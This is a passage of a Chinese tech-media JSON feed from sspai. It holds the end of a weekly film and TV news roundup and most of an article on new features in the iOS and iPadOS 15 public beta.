href=\"https://movie.douban.com/subject/30484754/\">豆瓣链接</a></p>\n<blockquote><p>鱼和熊掌不可兼得，反派也有中年危机。</p></blockquote>\n<p>@潘誉晗：主人公魔多客是漫威的一名超级反派，他有着超级大的脑袋，并且这个脑袋承载了很多毁世的智慧。不过，这部动画的主要内容不是讲述他如何破坏这个世界，而是把重点放在了他的公司 AIM（先锋科技）破产之后，他陷入了中年危机的阶段。于是，这位头大身体小的疯狂科学家，开始努力地把自己的犯罪帝国继续下去，同时也要经营好自己的家庭，真是一系列让他「头大」的问题。</p>\n<p>在最近 Collider 评出的 2021 年上半年最佳剧集 TOP10 的榜单中，Hulu 出品的这部《魔多客》就在其中。作为漫威第一部 R 级类型的成人喜剧定格动画，虽然只有一季，但还是获得了不少观众的喜爱和好评。作为一个独立的动画项目，因为平台尺度的不限制，所以这个反派「坏」得很彻底，很放肆也很敢说。虽然是反派，但魔多客的哲学金句还是很多的，个人风格特别明显，是很台词向的动画，带着点黑色幽默，又有很多漫威粉熟悉的彩蛋和梗。不过大概也是因为这是前漫威时代电视部遗留下来的项目，所以并没有特别被重视，最后所呈现出来的效果和风格也令一些观众不适应。</p>\n<h3>✌️更多</h3>\n<p><a href=\"https://movie.douban.com/subject/34949767/\">[国产剧] 叛逆者</a> @Voyager_1：故事讲述 1936 年，年轻的复兴社特训班学员林楠笙，被特务处上海区站长陈默群带往上海，随后开始特务生涯的故事。饰演林楠笙的朱一龙既演出了新兵的朝气和少年感，又演出了随着阅历增长，添了几分老练和沉稳劲的行动队队长风范，剧情没有一丝拖沓的同时，靠着优秀的画面、运镜和细节，真实再现了那个年代人们的信仰之光。</p>\n<p><a href=\"https://movie.douban.com/subject/35432332/\">[日剧] 狮子之家的点心日</a> @潘誉晗：狮子之家是一个临终关怀疗养院，它坐落在濑户内海的柠檬岛上。女主小雫小姐在得知自己罹患绝症之后选择在这里度过自己最后的日子。狮子之家有一个特别的日子，每周日的点心日会抽签选出住户想吃的点心。一部典型的日式治愈剧集，缓缓的节奏，看起来既没压力也没负担。</p>\n<p><a href=\"https://movie.douban.com/subject/35074959/\">[美剧] 女巫前线：塞勒姆要塞 第二季 </a>@潘誉晗：虽然第一次看到「输出全靠唱」的模式让人觉得超惊吓，但是为了维护拥有超能力一族的存在，女巫们在年满 18 周岁时应征入伍类似于特种部队的设定还是很新奇的。三位年轻的女主各有各的性格特点，反传统的女巫军队很带感，这季一出场，副总统的女儿也有超能力了，很期待接下来的剧情。</p>\n<p><a href=\"https://movie.douban.com/subject/35447509/\">[日剧] 夜间医师</a> @潘誉晗：典型的日式热血医疗剧。以性格迥异、年龄不同、价值观完全不一样的五位医生作为主要人物，记录了他们以夜班医生的身份在工作上面临的各种生死问题。首集 13.4% 的收视说明了霓虹人民对于医疗剧的喜爱，不过走青春群戏设定的话，重要的还是看一个团队的成长了，中规中矩了点，有兴趣的朋友可看。</p>\n<h2>📅 本周新预告</h2>\n<h3>漫改 TV 动画《链锯人》公布预告</h3> <p>6 月 27 日，漫改 TV 动画《链锯人》公布了主创阵容及首支先导预告，中山龙执导，濑古浩司编剧，杉山和隆角色设计，押山清高恶魔设计，牛尾宪辅配乐，MAPPA 制作，播出时间待定。本作改编自藤本树的同名漫画，少年电次为还债，与链锯恶魔波奇塔合作，某天被诱杀后与对方结合，获得变身为链锯人的能力。 <a href=\"https://twitter.com/CHAINSAWMAN_PR/status/1409104491144630277\" target=\"_blank\">来源</a></p>\n<h3>怪兽尸体都去哪了？《大怪兽的善后处理》公布预告</h3> <p>7 月 2 日，松竹、东映首次联手拍摄的特摄喜剧电影《大怪兽的善后处理》（大怪獣のあとしまつ）公布预告，讲述了英雄拯救世界打倒怪兽后，怪兽尸体的处理过程，由三木聪执导，山田凉介、土屋太凤主演，将于 2022 年在日本上映。</p>\n<h3>动画电影《狼行者》7 月 3 日中国内地上映</h3> <p>6 月 29 日，动画电影《狼行者》发布终极预告。该片由《凯尔特经》《海洋之歌》导演汤姆·摩尔和罗斯·斯图尔特执导，将于 7 月 3 日中国内地上映。</p>\n<h3>Apple TV+ 剧集《基地》9 月 24 日开播</h3> <p>6 月 28 日，根据艾萨克·阿西莫夫的科幻小说《基地三部曲》改编，李·佩斯、杰瑞德·哈里斯等主演的 Apple TV+ 剧集《基地》发布全新预告。该剧首季共 10 集，将于 9 月 24 日开播。</p>\n<p>《基地三部曲》分为《基地》《基地与帝国》《第二基地》，故事讲述银河帝国已有一万二千年悠久历史，一位心理史学家却作出惊人预言：帝国即将土崩瓦解，整个银河注定化作一片废墟，黑暗时期将会持续整整三万年。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1aL411p7eb?from=search&amp;seid=14400149403907620656\" target=\"_blank\"><strong>蕾雅·赛杜主演电影《我妻子的故事》首曝预告：</strong></a>6 月 30 日，改编自米兰·福斯特同名小说，由伊尔蒂科·茵叶蒂执导，蕾雅·赛杜主演的电影《我妻子的故事》发布首支预告。该片已入围第 74 届戛纳电影节主竞赛单元。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1oX4y1c75A?from=search&amp;seid=8047563989565365935\" target=\"_blank\"><strong>凯特·贝金赛尔主演电影《警醒》7 月 23 日登陆亚马逊 Prime Video：</strong></a>由谭雅·维克斯勒执导，凯特·贝金赛尔、鲍比·坎纳瓦尔、杰·科特尼、拉弗恩·考克斯、苏珊·萨兰登、斯坦利·图齐等主演的动作片《警醒》发布正式预告。该片将于 7 月 23 日登陆亚马逊 Prime Video。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1KM4y1M78W?from=search&amp;seid=8524753417857274726\" target=\"_blank\"><strong>《屏住呼吸 2》发布正式预告，北美定档 8 月 13 日：</strong></a>由罗多·赛亚格斯执导，史蒂芬·朗、罗奇·威廉姆斯、斯蒂芬妮·阿西拉、鲍比·斯科菲尔德、亚当·扬等主演的《屏住呼吸 2》发布正式预告。</p>\n<p><a href=\"https://www.bilibili.com/video/BV13B4y1T7mY?from=search&amp;seid=4018815923590081929\" target=\"_blank\"><strong>《黑道家族》前传电影《纽瓦克众圣》发布正式预告，10 月 1 日北美上映</strong></a>：阿兰·泰勒执导，亚历桑德罗·尼沃拉、小莱斯利·奥多姆、乔·博恩瑟、维拉·法米加等主演，10 月 1 日同步上线 HBO Max。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1164y1k7zR?from=search&amp;seid=2960816663023141592\" target=\"_blank\"><strong>《海绵宝宝》衍生动画剧《The Patrick Star Show》定档预告片：</strong></a>聚焦派大星主持的深夜脱口秀，不仅有新角色出现，还会有其它海绵宝宝角色，将于 7 月 9 日开播。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1464y197fw\" target=\"_blank\"><strong>漫改 TV 动画《平稳世代的韦驮天们》：</strong></a>改编自天原原作，クール教信者担任重制版作画的同名漫画，城所圣明执导，濑古浩司担任系列构成、编剧，MAPPA 制作，7 月 22 日开始播出。 <a href=\"https://twitter.com/idaten_anime/status/1409049273002467328\" target=\"_blank\">来源</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1Pw411Z7vu\" target=\"_blank\"><strong>OVA 动画《噬血狂袭 FINAL》：</strong></a>改编自三云岳斗原作、麻喵子插画的同名轻小说，山本秀世执导，SILVER LINK.／CONNECT 制作，系本作的完结篇，讲述晓古城与姬柊雪菜等人最后的战斗。 <a href=\"https://www.youtube.com/watch?v=CIdaOP8QIW4\">来源</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV1U54y1J7hb?from=search&amp;seid=14799229627554190422\" target=\"_blank\"><strong>黄政民主演动作惊悚片《人质》首曝预告</strong></a>：该片由毕感成执导，翻拍自华语影片《解救吾先生》，将于 8 月韩国上映。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>《疾速追杀 4》宣布开机</h3>\n<p>该片定档明年 5 月 27 日北美上映，基努·里维斯回归主演，甄子丹、Rina Sawayama、比尔·斯卡斯加德、沙米尔·安德森、真田广之新加盟，《疾速追杀》系列导演查德·斯塔赫斯基继续执导，谢伊·哈顿（《疾速追杀3》）和迈克尔·芬奇（《代号47》）编剧。此外，媒体也拍到基努里维斯现身柏林片场，头戴蓝色发卡，十分可爱俊俏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/1d9c6930c3be82f8364b3a75aafda7bf.jpg\"></figure><h3>尼尔·盖曼小说改编剧集《好兆头》确定将拍第二季</h3>\n<p>6 月 29 日，亚马逊正式宣布续订《好兆头》第二季，并发布预告海报。第二季共 6 集，大卫·田纳特、麦克·辛回归出演，将于今年在苏格兰开拍。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/article/c998699cb0a9bfa7000edd3104316eaa\"></figure><h3>漫画《来自深渊》将改编为好莱坞真人电影</h3>\n<p>6 月 25 日，据 Deadline 独家报道，索尼哥伦比亚影业正在进行《来自深渊》真人电影的早期工作，凯文·麦克马林编剧，罗伊·李和冈政伟担任制片人。本作改编自土笔章人的同名漫画，少女莉可为了再次见到母亲，和捡来的机器人雷古潜入深渊，在瑰奇而危机四伏的世界中展开冒险，TV 动画第二季将于 2022 年播出。 <a href=\"https://deadline.com/2021/06/made-in-abyss-kevin-mcmullin-to-adapt-manga-for-roy-lee-masi-oka-sony-1234781677/\" target=\"_blank\">来源</a></p>\n<h3>日漫改国产真人网剧《月刊少女》开机</h3>\n<p>改编自椿泉漫画《月刊少女野崎君》的国产网剧《月刊少女》已于近日开机，爱奇艺出品，钟青导演，沈月、王敬轩、赵弈钦、曾可妮等主演。学霸陆也奇梦想成为热血少年漫画家，却阴差阳错走上了少女漫画的道路，暗恋他的女生左千黛在表白未果后也被拉入团队，小小的工作室内，关于青春、友谊和梦想的故事每天交织上演。 <a href=\"https://weibo.com/3899327798/KmoB38QWE\" target=\"_blank\">来源</a></p>\n<h3>辛普森 × 漫威联动短片《The Good, the Bart, and the Loki 》7 月 7 日上线 Disney+</h3>\n<p>汤姆·希德勒斯顿继续配音洛基，讲述他被驱逐出阿斯加德，不得不面对有史以来最强大的对手：辛普森一家和春田市最强大的英雄们。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/article/7e16eab13b8ccdf30ef5c5e53472b5f1\"></figure><h3>《新·福音战士剧场版：终》8 月 13 日独家登陆 Amazon Prime Video</h3>\n<p>7 月 1 日，亚马逊拿下了《新·福音战士剧场版：终》在日本之外的首播权，该片将在 8 月 13 日独家登陆 Amazon Prime Video。<a href=\"https://www.theverge.com/2021/7/1/22559498/amazon-prime-video-evangelion-rebuild-us-streaming-release\" target=\"_blank\">来源</a></p>\n<h3>更多</h3>\n<p><strong>游戏改 TV 动画《圣剑传说 玛娜传奇 -The Teardrop Crystal-》：</strong>改编自 Square Enix 于 1999 年发布的同名游戏，系列 30 周年纪念而决定首次动画化，复刻版于 2021 年 6 月 24 日发售。 <a href=\"https://twitter.com/Seiken_PR/status/1409128358013595649\" target=\"_blank\">来源</a></p>\n<p><strong>轻改 TV 动画《异世界食堂》第二季：</strong>改编自犬冢惇平的同名轻小说，神保昌登执导，OLM 制作，10 月开始播出。位于东京角落的猫咪西餐厅，大门与异世界连接，吸引奇幻生物光顾。 <a href=\"https://twitter.com/nekoya_PR/status/1409708204674760704\" target=\"_blank\">来源</a></p>\n<p><strong>众星云集的《利刃出鞘2》已经在希腊开机：</strong>该片主演包括丹尼尔·克雷格、爱德华·诺顿、戴夫·巴蒂斯塔、加奈儿·梦奈、凯瑟琳·哈恩、小莱斯利·奥多姆、凯特·哈德森等。这部续集继续由导演莱恩·约翰逊自编自导，将拍摄两部续集。</p>\n<p><strong>《海王》系列新片《海王与失落王国》正式开拍：</strong>导演温子仁社交平台晒出《海王与失落王国》场记板照片，宣布本片正式开拍。《海王》新片制作代号：「涅克鲁斯（Necrus）」，讲述七海之王故事的新篇章。杰森·莫玛、艾梅伯·希尔德、帕特里克·威尔逊等回归出演，本片将于 2022 年 12 月 16 日上映。</p>\n<p><strong>纪录片《今敏：造梦机器》发布正式海报：</strong>由帕斯卡尔-亚历克斯·文森特执导的纪录片《今敏：造梦机器》发布法版正式海报。该片已入围第 74 届戛纳电影节「经典修复单元」。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67534"},{"title":"iOS / iPadOS 15 公测版来了，哪些新功能值得尝鲜？","date":"2021-07-02 08:18:15","description":"\n<p>经过 2 个版本的开发者测试，Apple 在 7 月 1 日发布了 iOS 15 和 iPadOS 15 的 Public Beta 公开测试版本。iOS 15 和 iPadOS 15 是 Apple 在 WWDC21 开发者大会上推出的新版操作系统，目前正在面向开发者和用户进行测试，正式版预计在秋季发布。</p>\n<p>在这篇文章中，我们将带大家快速浏览 iOS 15 和 iPadOS 15 中值得尝鲜的新功能。如果你想尝鲜 iOS / iPadOS 15公开测试版，可以在 <a href=\"https://beta.apple.com/sp/betaprogram/\" target=\"_blank\">Appl</a><a href=\"https://beta.apple.com/sp/betaprogram/\">e 官网</a> 申请 Apple Beta 版软件计划。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67514\" target=\"_blank\">iOS / iPadOS 15 公测版来了：新系统升降级指南 &amp; 注意事项</a></p>\n\n<div>\n<p>WWDC21 开发者大会期间，少数派也为大家带来了针对新系统、新技术的持续跟进和报道，也与几位长期关注和参与 Apple 生态工作的开发者和产品人进行了深度讨论。为了让你更加完整和系统性地回顾这些内容，少数派也将它们整理成了专题页面，你可以访问下方链接查看我们带来的热点资讯、深度报道以及之后更新的更多内容。</p>\n<p>📱 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\" class=\"insert-link\">少数派带你看 WWDC21</a></p>\n</div>\n\n<h2>iOS 15</h2>\n<p>iOS 15 中，除了之前传闻的新的通知样式和管理方式，专注模式 (Focus)、实况文本 (Live Text)、全新天气 App 等的加入，也值得我们关注。</p>\n<h3>实况文本</h3>\n<p>实况文本 (Live Text) 是 iOS 15 上系统级的 OCR 文本识别工具，使用方法也非常多样。首先，在系统相机中，如果当前取景框识别到画面中有文本内容，取景框右下角 (竖屏) 或者右上角 (横屏) 会自动显示实况文本按钮，点击之后取景框内会将识别到的文字以单独的弹窗显示，在弹窗中选择文字之后可以进行拷贝、查询、分享或者通过系统翻译 App 进行翻译的操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/b83818466be6724a96ca0a81ea5dd91e.jpg\"></figure><p>在第三方 App 中，也能直接调用实况文本功能。在输入框点击唤出键盘之后，再次点按输入框唤出文本操作快捷选单，选择「来自相机的文本」，整个键盘区域都会变成相机取景窗，直接对准文字系统识别到的内容会自动输入进文本框，点击取景框右下角的实况文本按钮则可以进行与上述相机内相同的多项文本操作。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/d527ff562e673623b4bdb5c89ef73500.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/355f8b58ba0c24a362a3f1ed0562568a.PNG\" alt=\"\"></figure><p>除了通过相机取字，iOS 15 也支持支持直接识别已有照片的文字。比如在照片或者信息应用中点击含有文字的图片，右下方会自动出现实况文本按钮，点击即可开始选字操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/5ad1e5d88666be4d07bd1ae36471e537.jpeg\"></figure><p>除了识别文字，发布会上还介绍了 iOS 15 中名为 Visual Look Up 的功能，可以帮助用户识别相片中的场景、物品，支持的内容范围包括动植物、绘画、书本、建筑等各种信息。不过，我们目前还没有在 iOS 15 的第一个测试版本中发现这项功能，可能会在之后更新加入。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/article/fc37722f5daa2709f216b60f0768e0bd\"><figcaption>图 / Apple</figcaption></figure><h3>专注模式 / 通知管理</h3>\n<p>iOS 15 重新设计了通知横幅的提醒样式，通知中的应用图标尺寸更大，如果是来自信息 App 或者其它通讯工具中的通知，还会直接显示消息发送者的头像，方便用户更快了解通知来源和类型。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/4043654003830ebc0566ac809ef655bb.png\"><figcaption>信息类通知会直接显示对方头像，图 / Apple</figcaption></figure><p>由于应用图标和通知内容方面布局的调整，通知横幅中的文本也变得更加直观与易读。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/0a8baa98e887154d785c4c43066e8984.png\"></figure><p>除了样式调整，iOS 15 推出了新的通知形式：通知摘要 (Notification summary)。通知摘要允许用户指定特定 App，这些 App 的通知会折叠在通知摘要横幅中，并在一天中的指定时间进行推送，通知摘要的每日推送次数支持设置范围为 1-12 次，每次均可以自行设置时间，联系人信息的通知不会被折叠进通知摘要。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/d878dda0a16308d3386b9d8075ce482d.jpeg\"></figure><p>通知摘要功能会在设备本地学习用户的使用习惯，将通知按照优先级顺序自动进行排列</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/3aaa60e09f822354579c9aa4e60f935f.png\"></figure><p>为了进一步让用户控制通知功能，降低无关通知带来的打扰，iOS 15 推出了全新的通知管理功能：专注模式 (Focus)。专注模式可以让用户根据不同的场景，允许不同的 App 发送通知，还支持自动化开启以及在其它装置上进行同步。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/830f521af9f9e8aa99cf9c4aa1381ef8.PNG\"></figure><p>比如，工作的时候启用工作模式，用户可以指定只有工作上的同事与合作伙伴可以发送消息、拨打电话给自己，也可以指定只有如飞书、Notion 等工作上需要的 App 才能发送通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/c9394728554fb647763b271c53dcf4c3.png\"></figure><p>专注模式还支持设置主屏幕页面的显示状态，比如你可以单独设置一个页面，将所有工作的 App 放在页面中，开启工作模式的时候，主屏幕只会显示着一个页面，开启个人模式的时候，这个页面就会隐藏，不会有工作相关的 App 打扰到你。</p>\n<p>开启专注模式或者勿扰模式之后，当有好友发送 iMessage 消息给你时，对方的信息窗口会提示你开启勿扰模式或者已通过专注模式开启勿扰功能。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/08/article/06b9fa4a592adec29566e100af660d4c?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>图 / Apple</figcaption></figure><h3>天气</h3>\n<p>天气 App 在 iOS 15 中的变化也非常大。首先，应用经过了完全重新设计，不同天气数据会以卡片的形式从上到下进行展示，比如空气质量、24 小时天气预报、10 日天气预报等等。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/27df811edf0253a49abe58878ce99cfc.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/dcac3bd1683382f63c2f75cf132e265a.PNG\" alt=\"\"></figure><p>值得一提的是，天气 App 不仅保留了之前的「拟物」界面设计，对于降雨、云朵等天气状况的动效设计还变得更加精致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/0555b447d5d9b0800838aa77dbebd4c8.gif\"></figure><p>数据方面，新版天气 App 支持了更多类型的数据展示，比如紫外线指数、日落时间、风速和风向、能见度、气压等等。点击左下角的按钮，还可以根据气温、降水强度、空气质量查看天气地图。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/b6137f955814dc11c82c6113b8d42643.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/09/4ac3349ee268c1444a6f882eddc63b6b.PNG\" alt=\"\"></figure><p>最后，天气 App 终于支持了通知功能，应用支持指定特定城市，当这些地方出现降雨或者降雪天气时，应用就会发送提醒通知。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/91df8544d3bb9a855f34678a70412789.jpeg\"></figure><h3>FaceTime</h3>\n<p>SharePlay 是 FaceTime 在 iOS 15 上获得的新功能，它可以让正在通话的使用者之间共享正在播放的音乐、视频或者是屏幕内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/975022f00d66c17191effe784e547421.png\"><figcaption>图 / Apple</figcaption></figure><p>为了提供更好的通话体验，iOS 15 为 FaceTime 带来了语音突显 (Voice Isolation)、空间音频、人像模式。其中，语音突显功能会智能识别通话时的人声，降低背景噪音，以获得更好的通话质量；空间音频可以带来更加「立体」的通话体验，人像模式则能让人物在画面中获得强调，让通话者成为画面中的焦点。</p>\n<p>此外，语音突显和人像模式不只能在 FaceTime 中使用，开发者无需适配也能在第三方 App 中直接使用 2 项功能。如果你正在拨打语音电话或者视频通话，可以在控制中心找到功能入口并进行打开或者关闭控制。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/2e1f475576db578a2b9337f8b21226fa.png\"></figure><p>新版 FaceTime 增加了「通话链接」功能，通过点击应用主界面的「创建链接」按钮，FaceTime 会自动创建一个名为「FaceTime 通话链接」的空白通话，用户可以创建不限数量的通话链接，并将链接分享给他人，他人可以通过链接直接加入 FaceTime 通话。通过 FaceTime 即将推出的 Web 版本，Android 和 Windows 也可以通过通话链接加入通话。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/c1f4b872ba3785c8d52a639ffb5ecea9.jpg\"></figure><h3>信息</h3>\n<p>信息 App 方面，除了按照惯例增加 Memoji 表情之外，「与您共享」和照片合辑 (Photo collections) 都是值得关注的特性。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/8f543c1ac305031421fdcd7eb363ae2d.png\"><figcaption>图 / Apple</figcaption></figure><p>「与您共享」功能可以在信息的系统设置中开启，目前支持了系统照片、播客、视频、音乐和 Safari 浏览器。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/09/360a53983c31e2b5e73a16af64dea940.jpeg\"></figure><p>开启之后，你通过 iMessage 给其他人发送的照片、播客节目、音乐、网址等等，都会在对应的 App 内出现在共享板块中，同时显示共享来源。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/10/47e97c12f910d79f3688b7d84e973b9b.jpg\"><figcaption> Safari 中的「与您共享」板块</figcaption></figure><p>现在，你还可以通过 iMessage 同时发送多张照片，照片会自动合辑成组，左右滑动可以切换查看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/9f8f6654ebc1999a8689ae80d285014e.gif\"></figure><h3>照片</h3>\n<p>在照片应用中，回忆功能提供了更多自定义选项，目前应用内提供了 12 种不同效果的滤镜可供选择，还集成了 Apple Music，用户可以选择热门的建议歌曲、或者通过搜索，将喜欢的歌曲作为回忆的背景音乐，让回忆具有更加符合自己喜好的风格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/daddf1858b7b28d5a0f13b9e6bf94c67.gif\"></figure><h3>其它值得关注的 iOS 15 新功能</h3>\n<ul>\n<li>钱包 App 将支持身份证、工牌、门卡类型的卡券，Aqara 将作为国内首批支持厂商。</li>\n<li>健康 App 新增步行稳定性分析、趋势数据，支持与家人共享健康数据。</li>\n<li>系统隐私设置选项中增加「记录 App 活动」，这里会记录 7 天内所有 App 访问过的数据以及访问频次。</li>\n<li>辅助功能支持为单个 App 单独设置文本粗体样式、字号等。</li>\n<li>新增查找、Game Center、App Store、睡眠模式等系统功能小组件。</li>\n<li>设备关闭或被抹掉全部内容之后，也能通过查找 App 寻找位置。</li>\n<li>地图 App 应用中，城市道路、建筑细节变得更丰富，驾驶时的导航数据也变得更加精准，支持了 AR 步行导航和公共交通整合的功能等。</li>\n</ul>\n<h2>iPadOS 15</h2>\n<p>除了和 iOS 15 一样带来了新的专注模式、通知管理、实况文本、聚焦搜索等新功能，今年的 iPadOS 15 更新依然围绕着「专为 iPad 设计」这一主题，进一步将 iPad 的使用场景和定位与 iPhone 进行了区分。</p>\n<h3>多任务处理</h3>\n<p>iPadOS 15 重新设计了多任务处理有关的大部分功能。首先是分屏入口变得更容易找到，所以正在显示的 App 顶部都有一个「…」的菜单，点击以后就可以看到 iPad 上的分屏入口了，更方便用户用户找到分屏的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/08862d76842e7c05b2373bbc519638e3\"><figcaption>入口变得更易使用</figcaption></figure><p>iPadOS 15 还优化了分屏以后选择 App 的方式。在 iPadOS 14 中，我们想要打开另一个软件的分屏，只能在 Dock 栏中选择，选择范围非常小，只有常驻的应用和最近打开的 3 个非常驻应用。在 iPadOS 15 通过顶部菜单选择分屏模式以后，当前显示的 App 会暂时挪动到一侧并显示主界面，方便用户可以从主界面和 App 资源库中自由选取应用，大大减少了过去繁复的步骤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/6f6e378259270e4a20d835c2ae44180a\"><figcaption>不止可以在 Dock 还可以在桌面和 App 资源库中选择</figcaption></figure><p>当然如果你已经习惯了以前拖拽新建分屏的操作，iPadOS 15 中你依然可以那么做，而且现在变得更加方便。在 iPadOS 15 的 App 切换界面，你可以直接把一个应用程序拖拽到已经打开的窗口上，新的分屏视图就会自动创建了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/109ae02fb7c3e263b86596c28a0531a2.gif\"><figcaption>直接拖拽就可以创建</figcaption></figure><p>对于同一个 App 打开了多个窗口的情况，iPadOS 15 也做了针对性的优化——「App 架」，通过 App 架用户可以查看一个应用程序的所有的窗口。无论是打开 App 时、还是使用分屏菜单、使用拖拽的分屏操作或是和以前一样使用「显示所有窗口」按钮，只要是这个应用已经打开了不止一个窗口，App 架就会出现来让用户选择最正确的窗口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/f8b6c75c23e5c6573e514d08d9b33d13.gif\"><figcaption>App 架会在必要时出现</figcaption></figure><p>iPadOS 15 的多任务视图目前还针对系统内的邮件、笔记和消息对话提供了一个新的分屏方式「在屏幕中央打开」，通过这种分屏方式可以快速浏览、添加或是回复内容，而不用像以前一样切换到其他窗口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/47f9a85a07c649d71a0e05601b338014.gif\"><figcaption>新的分屏方式</figcaption></figure><h3>小组件、App 资源库</h3>\n<p>经过了一年的等待，App 资源库终于来到了 iPadOS 15，它位于 Dock 的最右侧，无论是在桌面还是在应用内都可快速调用 App 资源库。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/dba9a7e761758dd531be9f9d34770148\"><figcaption>位于 Dock 最右的 App 资源库</figcaption></figure><p>同时小组件也能和 iOS 14 一样摆放在桌面上了，用户可以通过小组件的摆放获得非常个性化的信息浏览体验。而针对 iPad 拥有更大的显示屏，iPad 上小组件也新增了更大的尺寸，这样可以展示的信息也会比原来更多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/5c7795743aeb23a187a1cfca944f808b\"><figcaption>超大尺寸的日历能够展示更多的信息</figcaption></figure><p>新的智能堆叠组件也变得更智能了，它不仅会根据用户过去的活动适时地选择堆叠中的组件；它还会预测即将到来的事件，把那些不在堆叠里的小工具，暂时性置顶在堆叠中，并在完成后自动消失。让用户一目了然地获得更多的信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/0268015b7c665d368bf5439bc8d1407e\"><figcaption>日历原本并不在堆叠中</figcaption></figure><h3>备忘录</h3>\n<p>备忘录应用在 iPadOS 15 上也得到了质的提升。首先是快速笔记功能，原本想要在 iPadOS 上新建一个笔记只有两种办法，一是通过控制中心预先放置的按钮新建，二是通过 Apple Pencil 在锁屏界面点击一下新建。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/e943f55dad7efd0a4362d7ed5ea8485c.gif\"><figcaption>从角落唤出快速笔记</figcaption></figure><p>而 iPadOS 15 对快速笔记做了次逻辑上的升级，像是便签纸一样，用户可以在<strong>任何界面</strong>用 Apple Pencil 把它从右下角「拽」出来。这张「便签纸」还可以任意放大缩小并改变所在的位置，或是临时将它隐藏起来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/3db0107d871a08766320fcb06f9f61e9.gif\"><figcaption>可放大可缩小可隐藏</figcaption></figure><p>除了能在这张「纸」上写写画画，用户还可以把网页或者应用程序的链接放到便签纸上，当用户下次再次打开这个网页和应用程序时，快速笔记的缩略图会重新出现在角落里，提醒用户曾经做过与之相关的笔记。甚至在「亲儿子」Safari 里，用户还可以把文本和图像突出标记以后，直接放入到快速笔记里，用于持续跟踪访问过的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img 